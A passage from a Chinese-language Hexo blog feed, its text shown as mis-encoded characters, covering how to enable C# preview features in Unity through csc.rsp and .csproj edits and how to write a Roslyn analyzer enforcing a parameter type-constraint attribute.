çš„éƒ¨åˆ†ç‰¹æ€§ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª <code>csc.rsp</code> æ–‡ä»¶æ”¾åœ¨ <strong>Assets&#x2F; ç›®å½•</strong>ä¸‹ï¼ˆ<strong>æˆ–è€…ä½ çš„ç¨‹åºé›†çš„åŒç›®å½•</strong>ï¼‰ï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-langversion:preview -<span class="literal">null</span>able</span><br></pre></td></tr></table></figure><p>è¿™äº›æŒ‡ä»¤æ˜¯å°†è¯­è¨€ç‰ˆæœ¬<strong>è®¾ç½®ä¸ºé¢„è§ˆçŠ¶æ€</strong>ï¼Œç„¶å<strong>å¯ç”¨nullableç¼–è¯‘</strong></p><blockquote><p>  å…³äºåè€…ï¼Œä½ å¯ä»¥åœ¨ä»£ç ä¸­ä½¿ç”¨  ? æ¥å£°æ˜ä¸€ä¸ªç±»å‹<strong>å¯ä¸º null</strong>ï¼Œæ¯”å¦‚ï¼š</p>  <figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">struct</span> Example</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">int</span>? ValueInt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å¦‚æœä¸å¯ç”¨çš„ nullableï¼Œä½¿ç”¨ ï¼Ÿ ä¼šè­¦å‘Šä½  â€œéœ€è¦åœ¨ #nullable çš„ä¸Šä¸‹æ–‡ä½¿ç”¨â€ã€‚</p></blockquote><p>ç„¶åä½ å¯ä»¥åœ¨ä½ çš„è„šæœ¬é‡Œé¢ä½¿ç”¨ C#11 çš„ç‰¹æ€§ï¼Œ<strong>å›åˆ° UnityEditor ä¸­</strong>çœ‹çœ‹èƒ½ä¸èƒ½é€šè¿‡ç¼–è¯‘ã€‚ä»¥ä¸‹æ˜¯ä¸€æ®µç®€å•çš„æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">struct</span> DefaultValue</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// set default value in struct field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Value = <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">struct</span> NonArgConstructor</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// struct constructor with no-args</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NonArgConstructor</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">Value = <span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ ä½¿ç”¨çš„è¾ƒæ–°çš„ unity 2022.3 ï¼ˆ&gt;&#x3D; 2022.3.12f1ï¼‰é‚£ä¹ˆè¿™æ®µä»£ç æ˜¯å¯ä»¥é€šè¿‡ç¼–è¯‘çš„ï¼ˆå½“ç„¶ä½ ä¹Ÿå¯ä»¥æ•´ä¸ª mono ç±»å»åˆ›å»ºè¿™ä¸¤ä¸ª struct è¾“å‡ºç¡®è®¤æ˜¯å¦çœŸçš„è®¾ç½®æˆäº†æŒ‡å®šçš„é»˜è®¤å€¼ï¼‰</p><p>ä¸è¿‡ä½ åœ¨ç¼–å†™ä¸Šè¿°ä»£ç çš„æ—¶å€™ï¼ŒIDE é‡Œé¢ä¸€å®šæ˜¯ä¸€ç‰‡çˆ†çº¢å§ :laughing: ã€‚</p><p>ä¸ç”¨æ‹…å¿ƒï¼Œè®© csproj æ¥æ•‘ä½ ï¼ˆx</p><h2 id="Change-csproj-files"><a href="#Change-csproj-files" class="headerlink" title="Change .csproj files"></a>Change .csproj files</h2><p>åœ¨å‰é¢æœ‰è¯´è¿‡ï¼ŒUnity é¡¹ç›®æ ¹ç›®å½•çš„ .csproj æ–‡ä»¶éƒ½æ˜¯ç»™ IDE çœ‹çš„ï¼Œä½ å¯ä»¥éšä¾¿æ‰“å¼€ä¸€ä¸ª .csproj æ–‡ä»¶ï¼Œé‡Œé¢åº”è¯¥å¾ˆå®¹æ˜“æ‰¾åˆ°ä¸€è¡Œå†…å®¹æ˜¯ï¼š<code>&lt;LangVersion&gt;9.0&lt;/LangVersion&gt;</code></p><p>è¿™ä¼šå¯¼è‡´ä½ çš„ IDE ä¼šè®¤ä¸ºä½ çš„é¡¹ç›®ä½¿ç”¨ C#9 ï¼Œæ‰€ä»¥å‰é¢ç¼–å†™ C#11 çš„ä»£ç çš„æ—¶å€™è‡ªç„¶æ˜¯ä¼šæŠ¥é”™çš„å•¦ï¼ˆï¼‰ï¼Œä½ å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹æ–‡ä»¶è¯•è¯•ã€‚</p><p>å°è¯•å°†ä½ çš„ <code>Assembly-CSharp.csproj</code>  æ–‡ä»¶é‡Œé¢çš„ langversion é‚£ä¸€è¡Œæ”¹æˆ <code>&lt;LangVersion&gt;preview&lt;/LangVersion&gt;</code></p><blockquote><p>  å¦‚æœä½ ä½¿ç”¨ç¨‹åºé›†ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ª <code>My.Test.asmdef</code> çš„ç¨‹åºé›†ï¼Œé‚£ä¹ˆ UnityEditor ä¼šè‡ªåŠ¨ç»™è¿™ä¸ªç¨‹åºé›†ç”Ÿæˆä¸€ä¸ª <code>My.Test.csproj</code> ï¼ˆå½“ç„¶ä¹Ÿæ˜¯åœ¨é¡¹ç›®æ ¹ç›®å½•ï¼‰ï¼Œé‚£ä¹ˆ IDE å¯¹è¯¥ç¨‹åºé›†ä¸­çš„ä»£ç çš„è§£æï¼Œå°±ä¼šå—åˆ° <code>My.Test.csproj</code> çš„å½±å“ï¼Œè¿™æ—¶å€™éœ€è¦å»ä¿®æ”¹ <code>My.Test.csproj</code> é‡Œé¢çš„ langversion é€‰é¡¹äº†ï¼ˆï¼‰</p></blockquote><p>å›åˆ°ä½ çš„ IDE é‡Œé¢åº”è¯¥å°±ä¸ä¼šæŠ¥é”™äº†ã€‚</p><p>å½“ç„¶æ¯æ¬¡ç¼–è¯‘åï¼Œunity éƒ½ä¼šé‡æ–°ç”Ÿæˆä¸€éï¼Œæ‰€ä»¥å»ºè®®å†™ä¸ªè„šæœ¬ï¼Œè¯»å– csprojï¼Œ ç„¶åä¿®æ”¹ç›¸å…³çš„é€‰é¡¹ï¼Œç„¶åå¯ä»¥ç›‘å¬ <code>compilationFinished</code> äº‹ä»¶è‡ªåŠ¨æ‰§è¡Œã€‚</p><h2 id="Some-lunatic-ideas-for-higher-version-P-S"><a href="#Some-lunatic-ideas-for-higher-version-P-S" class="headerlink" title="Some lunatic ideas for higher version (P.S.)"></a>Some lunatic ideas for higher version (P.S.)</h2><p>è¿˜æœ‰ä¸€äº›æœ¬äººæ²¡æœ‰å®è·µè¿‡çš„æƒ³æ³•ï¼Œæœ‰äº›å·²ç»è¢«åˆ«äººå°è¯•è¿‡ï¼Œæœ‰äº›ä¸ç¡®å®šæœ‰æ²¡æœ‰äººè¯•è¿‡ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥ç©ç© :laughing:</p><ul><li>å¼€ä¸€ä¸ª C# é¡¹ç›®ï¼Œç›®æ ‡æ¡†æ¶è®¾ç½® <code>&lt;TargetFramework&gt;netstandard2.1&lt;/TargetFramework&gt;</code>ï¼Œç„¶åè¯­è¨€ç‰ˆæœ¬è®¾ç½® <code>&lt;TargetFramework&gt;latest&lt;/TargetFramework&gt;</code> ï¼Œåº”è¯¥èƒ½å¤Ÿä½¿ç”¨åˆ° C#12 ç”šè‡³æ›´é«˜çš„ç‰¹æ€§ï¼Œå½“ç„¶éƒ¨åˆ†ç‰¹æ€§å¯èƒ½ç¼ºå°‘é¢„å®šä¹‰ç±»ï¼Œå¯ä»¥é€šè¿‡ PolySharp æ¥è¡¥å……ï¼ˆï¼‰ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒ R3 é¡¹ç›®ã€‚</li><li>ä¿®æ”¹ä½ çš„ Unity Editor çš„ Roslyn ç¼–è¯‘å™¨ä¾èµ–çš„ SDK ç‰ˆæœ¬ï¼ˆï¼Ÿï¼‰ï¼ˆå¦‚æœè¦å°è¯•å»ºè®®å¤‡ä»½ä¸€ä¸‹ï¼‰</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆå¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unity </tag>
            
            <tag> Tutorial </tag>
            
            <tag> CSharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharpå®ç°å¼ºåˆ¶ç±»å‹é™å®š</title>
      <link href="/CSharp%E5%AE%9E%E7%8E%B0%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E9%99%90%E5%AE%9A/"/>
      <url>/CSharp%E5%AE%9E%E7%8E%B0%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E9%99%90%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="CSharp-å®ç°å¼ºåˆ¶ç±»å‹é™å®š"><a href="#CSharp-å®ç°å¼ºåˆ¶ç±»å‹é™å®š" class="headerlink" title="CSharp å®ç°å¼ºåˆ¶ç±»å‹é™å®š"></a>CSharp å®ç°å¼ºåˆ¶ç±»å‹é™å®š</h1><p>ä¹‹å‰å¶ç„¶æœ‰äº›çµæ„Ÿï¼Œæƒ³ç€å¦‚æœé‡åˆ°äº†å¦‚ä¸‹æƒ…æ™¯ï¼Œéœ€è¦æ­¤å¤„çš„ object åªèƒ½æ˜¯æŸç§ç‰¹å®šç±»å‹ï¼Œæ¯”å¦‚å®ç°äº† <code>ITestInterface</code> è¿™ä¸ªæ¥å£ï¼Œé‚£ä¹ˆå¤§æ¦‚ä¼šå†™æˆä¸‹é¢è¿™æ ·ã€‚</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Method</span>(<span class="params"><span class="built_in">object</span> obj</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">is</span> ITestInterface target)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·åšè‡ªç„¶æ²¡å•¥é—®é¢˜ï¼Œä½†æ˜¯åªæœ‰åˆ°è¿è¡Œæ—¶æ‰çŸ¥é“ obj çš„ç±»å‹åˆ°åº•ç¬¦ä¸ç¬¦åˆè¦æ±‚ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½æŠŠ<strong>æ£€æŸ¥æå‰åˆ°ç¼–è¯‘æœŸ</strong>å‘¢ï¼Ÿä¹Ÿå°±æ˜¯åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™å°±èƒ½å¤Ÿå¾ˆå¤§ç¨‹åº¦é¿å…ä½¿ç”¨ä¸åˆè¦æ±‚çš„ç±»å‹ã€‚</p><p>å¯¹äº C# æ¥è¯´ï¼Œå…¶å®å¯ä»¥å†™ä¸€ä¸ªè¯Šæ–­åˆ†æå™¨æ¥å®ç°ã€‚</p><blockquote><p>  ä»¥ä¸‹ä½¿ç”¨ Unity 2022.3 å¯¹åº”çš„ç¯å¢ƒ</p></blockquote><span id="more"></span><h2 id="ç¼–å†™ä¹‹å‰"><a href="#ç¼–å†™ä¹‹å‰" class="headerlink" title="ç¼–å†™ä¹‹å‰"></a>ç¼–å†™ä¹‹å‰</h2><p>é‚£ä¹ˆæŒ‰ç…§æˆ‘çš„ä¸ªäººä¹ æƒ¯ã€‚è¿™é‡Œå…ˆå®šä¹‰ä¸€ä¸ª <code>TypeConstraintAttribute</code> ï¼Œè¦æ³¨æ„ç”±äºæ˜¯ç»™å‚æ•°åšä¸€ä¸ªé™å®šï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æŒ‡å®šè¿™ä¸ª attribute çš„ç›®æ ‡ä¸º <code>Parameter</code> ï¼Œåé¢çš„ä¸¤ä¸ªä¸€èˆ¬éƒ½æ˜¯è®¾ç½® <code>false</code> å°±è¡Œäº†ã€‚</p><blockquote><p>  è¿™é‡Œ <code>AllowMultiple</code> å¯ä»¥è€ƒè™‘è®¾ç½®æˆ trueï¼ˆä¹Ÿå°±æ˜¯ä¸€ä¸ªå‚æ•°å¯ä»¥æŒ‚å¤šä¸ª <code>[TypeConstraint]</code> ï¼‰ï¼Œç†ç”±åé¢å†è¯´ï¼ˆ</p></blockquote><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">AttributeUsage(AttributeTargets.Parameter, AllowMultiple = false, Inherited = false)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">TypeConstraintAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Type[] Constraints &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TypeConstraintAttribute</span>(<span class="params"><span class="keyword">params</span> Type[] constraints</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Constraints = constraints;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åªå®šä¹‰ attr è‡ªç„¶æ˜¯æ²¡å•¥ç”¨çš„ï¼Œä¸€èˆ¬å¯èƒ½ä¼šç»å¸¸é…åˆåå°„ï¼Œæºç”Ÿæˆå™¨ï¼Œåˆ†æå™¨ä¹‹ç±»çš„æ¥ç”¨ã€‚</p><blockquote><p>  æ ¹æ® Unity å®˜æ–¹æ‰‹å†Œä¸­çš„è¯´æ˜ï¼Œå¯¹äº Unity2022.3 çš„ editorï¼Œä½¿ç”¨çš„æºç”Ÿæˆå™¨é¡¹ç›®ç›®æ ‡æ¡†æ¶éœ€è¦æ˜¯ <code>netstandard2.0</code> ï¼Œç„¶åä¾èµ–çš„ <code>Microsoft.CodeAnalysis.CSharp</code> éœ€è¦æ˜¯ <code>3.8.0</code> ç‰ˆæœ¬</p></blockquote><p>æ‰€ä»¥å»å¦å¤–åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dotnet new classlib <span class="literal">-n</span> Analysis <span class="operator">-f</span> netstandard2.<span class="number">0</span></span><br><span class="line"><span class="built_in">cd</span> Analysis</span><br><span class="line">dotnet add package Microsoft.CodeAnalysis.CSharp <span class="literal">--version</span> <span class="number">3.8</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>ç„¶åé¡ºä¾¿æ‰“å¼€ <code>Analysis.csproj</code> æŠŠè¯­è¨€ç‰ˆæœ¬è®¾ç½®æˆ <code>9.0</code> ï¼ˆè¦ä¸ç„¶é»˜è®¤å°±åªæœ‰ <code>C#7.3</code> ï¼‰</p><p>ç°åœ¨é…ç½®æ–‡ä»¶é‡Œé¢åº”è¯¥å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">Sdk</span>=<span class="string">&quot;Microsoft.NET.Sdk&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetFramework</span>&gt;</span>netstandard2.0<span class="tag">&lt;/<span class="name">TargetFramework</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LangVersion</span>&gt;</span>9.0<span class="tag">&lt;/<span class="name">LangVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;Microsoft.CodeAnalysis.CSharp&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;3.8.0&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¼–å†™åˆ†æå™¨"><a href="#ç¼–å†™åˆ†æå™¨" class="headerlink" title="ç¼–å†™åˆ†æå™¨"></a>ç¼–å†™åˆ†æå™¨</h2><p>åœ¨é¡¹ç›®æ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ª <code>TypeConstraintAnalyzer.cs</code> ï¼Œç„¶ååœ¨å°±æ˜¯è¯Šæ–­å™¨çš„èµ·æ‰‹å¼ï¼ˆx</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Analysis</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DiagnosticAnalyzer(LanguageNames.CSharp)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">TypeConstraintAnalyzer</span> : <span class="title">DiagnosticAnalyzer</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">override</span> ImmutableArray&lt;DiagnosticDescriptor&gt; SupportedDiagnostics =&gt; <span class="keyword">throw</span> <span class="keyword">new</span> NotImplement();</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Initialize</span>(<span class="params">AnalysisContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.ConfigureGeneratedCodeAnalysis(GeneratedCodeAnalysisFlags.None);</span><br><span class="line">            context.EnableConcurrentExecution();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SupportedDiagnostics</code> å¯ä»¥å…ˆä¸ç®¡ï¼Œç„¶åå°±æ˜¯æ³¨å†Œä¸€äº›è¡Œä¸ºï¼Œä¸€èˆ¬å¯èƒ½æ³¨å†Œç¬¦å·è¡Œä¸ºæˆ–è€…è¯­æ³•èŠ‚ç‚¹è¡Œä¸ºï¼ˆï¼‰</p><p>å¯¹äºæˆ‘ä»¬è¦å®ç°å¯¹ç±»å‹çš„é™å®šï¼Œé‚£ä¹ˆç¬¬ä¸€æ­¥å°±æ˜¯å…ˆè§£æ<strong>å‡½æ•°å®šä¹‰</strong>å¤„ï¼Œå…¶å‚æ•°ä¸Šçš„ <code>[TypeConstraint(...)]</code> ä¸­çš„æä¾›çš„é‚£äº›é™å®šç±»å‹ã€‚è¿™æ„å‘³æˆ‘ä»¬éœ€è¦æŠŠè§£æåˆ°çš„ç›¸å…³ä¿¡æ¯å‚¨å­˜ï¼Œç„¶åç¬¬äºŒæ­¥è§£æå‡½æ•°è°ƒç”¨æ—¶æ ¹æ®å…ˆå‰çš„ä¿¡æ¯ç±»åˆ¤æ–­æ˜¯å¦ç¬¦åˆé™å®šã€‚</p><h3 id="åˆ†æ-Attribute"><a href="#åˆ†æ-Attribute" class="headerlink" title="åˆ†æ Attribute"></a>åˆ†æ Attribute</h3><p>å®šä¹‰ä¸€ä¸ª <code>AnalyzeSymbol</code> ï¼Œå¹¶æ³¨å†Œï¼š</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Initialize</span>(<span class="params">AnalysisContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// SymbolKind.Method è¡¨ç¤º AnalyzeSymbol ä¼šç”¨æ¥åˆ†æå‡½æ•°çš„ç¬¦å·ä¿¡æ¯</span></span><br><span class="line">    context.RegisterSymbolAction(AnalyzeSymbol, SymbolKind.Method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AnalyzeSymbol</span>(<span class="params">SymbolAnalysisContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æ£€æŸ¥å‚æ•°æ˜¯å¦æœ‰ <code>TypeConstraintAttribute</code> ä¹‹ç±»çš„ï¼Œæœ€åæŠŠå¯¹åº”çš„å‚æ•°ä¿¡æ¯å‚¨å­˜ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªå­—æ®µæ¥å‚¨å­˜</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Dictionary&lt;IMethodSymbol, Dictionary&lt;IParameterSymbol, ImmutableHashSet&lt;INamedTypeSymbol&gt;&gt;&gt; MethodConstraints = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AnalyzeSymbol</span>(<span class="params">SymbolAnalysisContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (context.Symbol <span class="keyword">is</span> <span class="keyword">not</span> IMethodSymbol methodSymbol) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (methodSymbol.Parameters.Length <span class="keyword">is</span> <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> parametersConstraints = <span class="keyword">new</span> Dictionary&lt;IParameterSymbol, ImmutableHashSet&lt;INamedTypeSymbol&gt;&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> parameter <span class="keyword">in</span> methodSymbol.Parameters)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// check if the parameter have TypeConstraintAttribute</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œæœ‰ç‚¹å¿˜äº†ï¼Œ&quot;TypeConstraintAttribute&quot; ä¸è¡Œçš„è¯å°±æ”¹æˆ &quot;TypeConstraint&quot; å§</span></span><br><span class="line">        <span class="keyword">var</span> attrs = parameter.GetAttributes().Where(attr =&gt; attr.AttributeClass.Name == <span class="string">&quot;TypeConstraintAttribute&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (attrs.Any() <span class="keyword">is</span> <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> typeConstraintAttr = attrs.First();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Correctly handle the type of ConstructorArguments</span></span><br><span class="line">        <span class="keyword">var</span> allowedTypes = typeConstraintAttr.ConstructorArguments</span><br><span class="line">            .SelectMany(arg =&gt; arg.Values)</span><br><span class="line">            .Select(arg =&gt; arg.Value <span class="keyword">as</span> INamedTypeSymbol)</span><br><span class="line">            .Where(type =&gt; type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span>)</span><br><span class="line">            .ToImmutableHashSet();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (allowedTypes.Any() <span class="keyword">is</span> <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        parametersConstraints.Add(parameter, allowedTypes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (parametersConstraints.Any())</span><br><span class="line">    &#123;</span><br><span class="line">        MethodConstraints[methodSymbol] = parametersConstraints;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  å¦‚æœæƒ³è¦æµ‹è¯•æœ‰æ²¡æœ‰æ­£ç¡®å»è§£æï¼Œå¯ä»¥æ‰“ä¸€äº› log åˆ°æ–‡ä»¶é‡Œé¢ï¼ˆå¦‚æœè¦æ–¹ä¾¿ç‚¹å»ºè®®ä½¿ç”¨ç»å¯¹è·¯å¾„å§ï¼‰</p></blockquote><p>è¿™é‡Œçš„ç›´æ¥å‚¨å­˜åˆ°å­—æ®µä¼šç»™ä½ ä¸€ä¸ªè­¦å‘Šï¼š<em>ä¸è¦å°†æ¯æ¬¡ç¼–è¯‘çš„æ•°æ®å­˜å‚¨åˆ°è¯Šæ–­åˆ†æå™¨çš„å­—æ®µä¸­</em></p><p>å¦‚æœæ‡’å¾—å»ä¼˜åŒ–çš„è¯ï¼Œå°±ç›´æ¥åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ ä¸€è¡Œ <code>#pragma warning disable RS1008</code>  å°±è¡Œã€‚</p><p>é¡ºä¾¿è¯´æ˜ä¸€ä¸‹ä¸Šé¢çš„ <code>allowedTypes</code> å§ï¼š</p><blockquote><p>  åœ¨ roslyn åˆ†æå™¨ä¸­ä¸èƒ½ç›´æ¥å»è·å–ä¸€ä¸ª Attribute å†…éƒ¨çš„å­—æ®µä¿¡æ¯ï¼Œä¸€èˆ¬æ˜¯ä»æ„é€ å‡½æ•°æ¥è·å–ä¿¡æ¯ã€‚</p><p>  åœ¨å…ˆå‰æˆ‘ä»¬å®šä¹‰çš„ attr æ—¶å€™æ˜¯è¿™æ ·çš„ï¼š</p>  <figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TypeConstraintAttribute</span>(<span class="params"><span class="keyword">params</span> Type[] constraints</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Constraints = constraints;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  ä¹Ÿå°±æ˜¯ constraints å‚æ•°æ˜¯ä¸€ä¸ª Type[] ï¼Œè™½ç„¶ä½¿ç”¨çš„æ—¶å€™å¯ä»¥åƒæ˜¯ä»»æ„æ•°é‡å‚æ•°é‚£æ ·ï¼Œä½†æ˜¯è§£æç¬¦å·çš„æ—¶å€™è¿™é‡Œæ˜¯ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å°±éœ€è¦å…ˆ SelectMany å† Select ï¼Œå¦‚æœç›´æ¥ <code>typeConstraintAttr.ConstructorArguments.Select(...)</code>  